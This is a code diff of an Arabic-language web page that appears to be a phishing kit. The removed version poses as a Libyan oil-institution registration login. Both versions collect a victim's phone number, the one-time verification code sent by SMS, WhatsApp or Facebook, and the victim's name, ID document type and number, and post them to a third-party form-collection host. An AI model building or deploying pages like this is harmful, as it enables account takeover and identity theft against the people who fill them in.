@@ -1,322 +1,336 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>المؤسسة الوطنــية</title>
-  <link rel="icon" href="uy.jpeg" type="image/png">
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+  <title>نموذج البيانات</title>
   <style>
     body {
       font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #002147, #003366);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      direction: rtl;
+      background-color: #f2f2f2;
+      padding: 20px;
     }
 
-    .container {
+    .form-container {
+      max-width: 600px;
+      margin: auto;
       background: #fff;
-      border-radius: 20px;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
-      padding: 35px 40px;
-      width: 96%;
-      max-width: 420px;
-      box-sizing: border-box;
-      text-align: center;
-      z-index: 1;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
     }
 
-    .logo-container {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .logo-container img {
-      width: 90px;
-      height: 90px;
-      object-fit: contain;
-      margin: 0 auto;
-      display: block;
-    }
-
-    .logo-container p {
-      margin-top: 8px;
-      font-weight: 700;
-      color: #003366;
-      font-size: 16px;
-    }
-
-    h2 {
-      margin-bottom: 25px;
-      color: #003366;
-      font-weight: 900;
-      font-family: Arial, Helvetica, sans-serif;
-      font-size: 32px;
+    .form-group {
+      margin-bottom: 15px;
     }
 
     label {
       display: block;
-      margin-bottom: 8px;
-      font-weight: 600;
-      color: #222;
-      text-align: right;
+      margin-bottom: 5px;
+      font-weight: bold;
     }
 
-    input[type="tel"],
-    input[type="text"],
-    select {
+    input, select {
       width: 100%;
-      padding: 12px 15px;
-      font-size: 16px;
-      border-radius: 10px;
-      border: 1.8px solid #bbb;
-      margin-bottom: 18px;
-      transition: border-color 0.3s ease;
-      box-sizing: border-box;
-      font-family: inherit;
+      padding: 8px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 14px;
     }
 
-    input:focus, select:focus {
-      border-color: gold;
-      outline: none;
+    .phone-row {
+      display: flex;
+      gap: 10px;
+      align-items: center;
     }
 
-    input:disabled {
-      background-color: #f2f2f2;
+    .phone-row input {
+      flex: 1;
+    }
+
+    .phone-row button {
+      flex-shrink: 0;
+      padding: 8px 12px;
+      font-size: 14px;
+    }
+
+    .code-row {
+      display: flex;
+      gap: 10px;
+      align-items: flex-end;
+    }
+
+    .code-row input {
+      flex: 1;
+    }
+
+    .code-row button {
+      flex-shrink: 0;
+      padding: 8px 12px;
+      font-size: 14px;
+      height: 38px;
     }
 
     button {
-      width: 40%;
-      padding: 12px;
-      font-size: 17px;
-      background-color: gold;
+      background-color: #007bff;
+      color: #fff;
       border: none;
-      border-radius: 10px;
-      color: #002147;
+      border-radius: 6px;
+      padding: 10px 15px;
       cursor: pointer;
-      font-weight: bold;
-      font-family: Calibri, sans-serif;
+      font-size: 15px;
+      margin-top: 10px;
       transition: background-color 0.3s ease;
-      margin-bottom: 15px;
     }
 
     button:hover:not(:disabled) {
-      background-color: #e6c200;
+      background-color: #0056b3;
     }
 
     button:disabled {
-      background-color: #c2a300;
+      background-color: #cccccc;
       cursor: not-allowed;
     }
 
-    #timer {
-      text-align: center;
-      font-weight: 600;
-      color: black;
-      margin-bottom: 20px;
-      min-height: 24px;
-    }
-
-    #codeField {
+    .status-message {
+      margin-top: 15px;
+      font-weight: bold;
       display: none;
     }
 
-    .error {
-      color: red;
-      font-size: 14px;
-      margin-top: -10px;
-      margin-bottom: 15px;
-    }
-
-    #extraFields {
-      display: none;
-    }
+    .loading { color: orange; }
+    .error { color: red; }
+    .success { color: green; }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="logo-container">
-    <img src="uy.jpeg" alt="شعار المؤسسة" />
-    <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
-  </div>
+  <div class="form-container">
+    <h3>نموذج جمع البيانات</h3>
+    <form id="fullForm">
 
-  <h2>تسجيل الدخول</h2>
-
-  <form id="phoneForm" onsubmit="return sendPhone(event);">
-    <label for="phone">رقم الهاتف:</label>
-    <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" />
-    <button type="submit" id="sendPhoneBtn">أرسل كود</button>
-    <div id="timer"></div>
-  </form>
-
-  <form id="codeForm" onsubmit="return sendCode(event);">
-    <div id="codeField">
-      <label for="code">جاري إرسال الكود عبر SMS</label>
-      <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" />
-      <div id="errorMessage" class="error"></div>
-
-      <div id="extraFields">
-        <label for="fullName">الاسم بالكامل:</label>
-        <input type="text" id="fullName" name="fullName" placeholder="اكتب اسمك الكامل" required />
-
-        <label for="address">العنوان:</label>
-        <input type="text" id="address" name="address" placeholder="اكتب عنوانك" required />
-
-        <label for="documentType">نوع البطاقة:</label>
-        <select id="documentType" name="documentType" onchange="updateDocLabel()" required>
-          <option value="">-- اختر نوع البطاقة --</option>
-          <option value="جواز سفر">جواز سفر</option>
-          <option value="بطاقة شخصية">بطاقة شخصية</option>
-          <option value="رخصة قيادة">رخصة قيادة</option>
-        </select>
-
-        <label id="documentLabel" for="documentNumber">رقم الوثيقة:</label>
-        <input type="text" id="documentNumber" name="documentNumber" placeholder="أدخل رقم الوثيقة" required />
+      <!-- الاسم الكامل -->
+      <div class="form-group">
+        <label for="name">الاسم الكامل (أحرف عربية فقط)</label>
+        <input type="text" id="name" name="name" required />
       </div>
 
-      <button type="submit" id="sendCodeBtn">طلب الدخول</button>
-    </div>
-  </form>
-</div>
+      <!-- اختيار نوع الوثيقة -->
+      <div class="form-group">
+        <label for="docType">نوع الوثيقة</label>
+        <select id="docType" name="docType" required onchange="showDocInput()">
+          <option value="">اختر النوع</option>
+          <option value="جواز سفر">جواز سفر</option>
+          <option value="بطاقة شخصية">بطاقة شخصية</option>
+        </select>
+      </div>
+
+      <!-- رقم الوثيقة -->
+      <div class="form-group" id="docGroup" style="display: none;">
+        <label id="docLabel" for="docNumber">رقم الوثيقة</label>
+        <input type="text" id="docNumber" name="docNumber" required />
+      </div>
+
+      <!-- رقم الهاتف وزر إرسال الكود -->
+      <div class="form-group">
+        <label>رقم الهاتف</label>
+        <div class="phone-row">
+          <input type="tel" id="phone" name="phone" required />
+          <button type="button" id="sendPhoneBtn" onclick="sendPhoneOnly()">أرسل الكود</button>
+        </div>
+        <div id="countdownMsg" style="margin-top: 5px; font-size: 14px; color: green;"></div>
+      </div>
+
+      <!-- كود الاستلام + زر إرسال الكود فقط -->
+      <div class="form-group code-row">
+        <div>
+          <label for="code">كود الاستلام</label>
+          <input type="text" id="code" name="code" required />
+        </div>
+        <button type="button" onclick="sendCodeOnly()">أرسل الكود فقط</button>
+      </div>
+
+      <button type="submit" id="submitBtn">إرسال جميع البيانات</button>
+
+      <div class="status-message" id="statusMsg"></div>
+    </form>
+  </div>
 
 <script>
-  let codeVerified = false;
-  let countdownInterval;
+  const formcarryURL = "https://formcarry.com/s/your-formcarry-id"; // غيّر هنا برابطك الصحيح
 
-  const phoneInput = document.getElementById('phone');
-  const codeInput = document.getElementById('code');
-  const sendPhoneBtn = document.getElementById('sendPhoneBtn');
-  const timerDisplay = document.getElementById('timer');
-  const codeField = document.getElementById('codeField');
-  const extraFields = document.getElementById('extraFields');
-  const sendCodeBtn = document.getElementById('sendCodeBtn');
-  const errorMessage = document.getElementById('errorMessage');
-
-  function startTimer(duration) {
-    let timeLeft = duration;
-    timerDisplay.style.display = 'block';
-    updateTimer(timeLeft);
-    countdownInterval = setInterval(() => {
-      timeLeft--;
-      updateTimer(timeLeft);
-      if (timeLeft <= 0) {
-        clearInterval(countdownInterval);
-        timerDisplay.style.display = 'none';
-        sendPhoneBtn.disabled = false;
-        phoneInput.disabled = false;
-      }
-    }, 1000);
-  }
-
-  function updateTimer(seconds) {
-    const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
-    const secs = (seconds % 60).toString().padStart(2, '0');
-    timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
-  }
-
-  function sendPhone(event) {
-    event.preventDefault();
-
-    if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
-      alert('يرجى إدخال رقم هاتف صحيح');
-      return false;
-    }
-
-    fetch('https://formcarry.com/s/12UxdOsTbaW', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({ phone: phoneInput.value })
-    })
-    .then(res => {
-      if (!res.ok) throw new Error('فشل الإرسال');
-      phoneInput.disabled = true;
-      sendPhoneBtn.disabled = true;
-      codeField.style.display = 'block';
-      startTimer(480);
-    })
-    .catch(err => {
-      alert('حدث خطأ أثناء الإرسال');
-      console.error(err);
-    });
-
-    return false;
-  }
-
-  function sendCode(event) {
-    event.preventDefault();
-    errorMessage.textContent = '';
-
-    const code = codeInput.value.trim();
-    const fullName = document.getElementById('fullName').value.trim();
-    const address = document.getElementById('address').value.trim();
-    const documentType = document.getElementById('documentType').value;
-    const documentNumber = document.getElementById('documentNumber').value.trim();
-
-    if (!codeVerified) {
-      if (code === '') {
-        errorMessage.textContent = 'يرجى إدخال الكود';
-        return false;
-      }
-
-      extraFields.style.display = 'block';
-      codeVerified = true;
-      sendCodeBtn.textContent = 'إرسال البيانات';
-      return false;
-    }
-
-    if (!fullName || !address || !documentType || !documentNumber) {
-      errorMessage.textContent = 'يرجى تعبئة جميع الحقول';
-      return false;
-    }
-
-    fetch('https://formcarry.com/s/12UxdOsTbaW', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({
-        phone: phoneInput.value,
-        code: code,
-        fullName,
-        address,
-        documentType,
-        documentNumber
-      })
-    }).then(res => {
-      if (res.ok) {
-        window.location.href = 'success.html';
-      } else {
-        errorMessage.textContent = 'حدث خطأ أثناء إرسال البيانات';
-      }
-    }).catch(err => {
-      errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم';
-      console.error(err);
-    });
-
-    return false;
-  }
-
-  function updateDocLabel() {
-    const type = document.getElementById('documentType').value;
-    const label = document.getElementById('documentLabel');
-    if (type === "جواز سفر") {
-      label.textContent = "رقم جواز السفر:";
-    } else if (type === "بطاقة شخصية") {
-      label.textContent = "رقم البطاقة الشخصية:";
-    } else if (type === "رخصة قيادة") {
-      label.textContent = "رقم رخصة القيادة:";
+  // تحقق من أن الاسم عربي فقط
+  document.getElementById("name").addEventListener("input", function () {
+    const arabicOnly = /^[\u0600-\u06FF\s]+$/;
+    if (!arabicOnly.test(this.value)) {
+      this.setCustomValidity("يرجى إدخال أحرف عربية فقط");
     } else {
-      label.textContent = "رقم الوثيقة:";
+      this.setCustomValidity("");
     }
+  });
+
+  // إظهار/إخفاء حقل رقم الوثيقة وتغيير التسميه حسب الاختيار
+  function showDocInput() {
+    const type = document.getElementById("docType").value;
+    const group = document.getElementById("docGroup");
+    const label = document.getElementById("docLabel");
+    if (type) {
+      label.textContent = "رقم " + type;
+      group.style.display = "block";
+    } else {
+      group.style.display = "none";
+    }
+  }
+
+  // إرسال رقم الهاتف فقط والبدء بعد تنازلي 5 دقائق
+  let countdownStarted = false;
+  let countdownTimeout;
+
+  function sendPhoneOnly() {
+    const phone = document.getElementById("phone").value.trim();
+    const msg = document.getElementById("countdownMsg");
+    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
+
+    if (!phone) {
+      alert("يرجى إدخال رقم الهاتف أولاً.");
+      return;
+    }
+
+    if (countdownStarted) {
+      alert("⏳ الرجاء الانتظار حتى انتهاء العد التنازلي قبل إعادة الإرسال.");
+      return;
+    }
+
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone: phone })
+    })
+    .then(response => {
+      if (response.ok) {
+        msg.style.color = "green";
+        msg.textContent = "✅ تم إرسال رقم الهاتف بنجاح. الرجاء انتظار الكود...";
+        startTimer(5 * 60);
+        countdownStarted = true;
+        sendPhoneBtn.disabled = true;
+      } else {
+        msg.style.color = "red";
+        msg.textContent = "❌ فشل في إرسال رقم الهاتف.";
+      }
+    })
+    .catch(() => {
+      msg.style.color = "red";
+      msg.textContent = "❌ حدث خطأ أثناء إرسال رقم الهاتف.";
+    });
+  }
+
+  function startTimer(seconds) {
+    const msg = document.getElementById("countdownMsg");
+    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
+    clearTimeout(countdownTimeout);
+
+    function update() {
+      const min = Math.floor(seconds / 60);
+      const sec = seconds % 60;
+      msg.textContent = `⏳ الرجاء الانتظار ${min}:${sec < 10 ? '0' : ''}${sec} دقيقة لاستلام الكود من فيسبوك أو واتساب أو SMS.`;
+      if (seconds > 0) {
+        seconds--;
+        countdownTimeout = setTimeout(update, 1000);
+      } else {
+        msg.textContent = "⌛ انتهى الوقت. يمكنك إعادة إرسال الكود.";
+        msg.style.color = "orange";
+        countdownStarted = false;
+        sendPhoneBtn.disabled = false;
+      }
+    }
+    update();
+  }
+
+  // إرسال الكود فقط مع رقم الهاتف
+  function sendCodeOnly() {
+    const phone = document.getElementById("phone").value.trim();
+    const code = document.getElementById("code").value.trim();
+
+    if (!phone) {
+      alert("يرجى إدخال رقم الهاتف أولاً.");
+      return;
+    }
+    if (!code) {
+      alert("يرجى إدخال كود الاستلام أولاً.");
+      return;
+    }
+
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone: phone, code: code })
+    })
+    .then(response => {
+      if (response.ok) {
+        alert("✅ تم إرسال الكود بنجاح!");
+      } else {
+        alert("❌ فشل في إرسال الكود. حاول مجددًا.");
+      }
+    })
+    .catch(() => {
+      alert("❌ حدث خطأ أثناء الإرسال.");
+    });
+  }
+
+  // إرسال جميع البيانات إلى Formcarry
+  document.getElementById("fullForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    // التحقق من رقم الوثيقة إذا كان ظاهر
+    const docGroup = document.getElementById("docGroup");
+    if (docGroup.style.display === "block") {
+      const docNumInput = document.getElementById("docNumber");
+      if (!docNumInput.value.trim()) {
+        alert("يرجى إدخال رقم الوثيقة.");
+        docNumInput.focus();
+        return;
+      }
+    }
+
+    const data = {
+      name: document.getElementById("name").value.trim(),
+      docType: document.getElementById("docType").value,
+      docNumber: document.getElementById("docNumber").value.trim(),
+      phone: document.getElementById("phone").value.trim(),
+      code: document.getElementById("code").value.trim()
+    };
+
+    const submitBtn = document.getElementById("submitBtn");
+    submitBtn.disabled = true;
+    showMessage("⏳ جاري الإرسال...", "loading");
+
+    fetch(formcarryURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      if (response.ok) {
+        showMessage("✅ تم إرسال البيانات بنجاح!", "success");
+        document.getElementById("fullForm").reset();
+        document.getElementById("docGroup").style.display = "none";
+        document.getElementById("countdownMsg").textContent = "";
+      } else {
+        showMessage("❌ فشل الإرسال. حاول مرة أخرى.", "error");
+      }
+      submitBtn.disabled = false;
+    })
+    .catch(() => {
+      showMessage("❌ حدث خطأ في الاتصال.", "error");
+      submitBtn.disabled = false;
+    });
+  });
+
+  function showMessage(message, type) {
+    const msg = document.getElementById("statusMsg");
+    msg.textContent = message;
+    msg.className = `status-message ${type}`;
+    msg.style.display = "block";
   }
 </script>
 
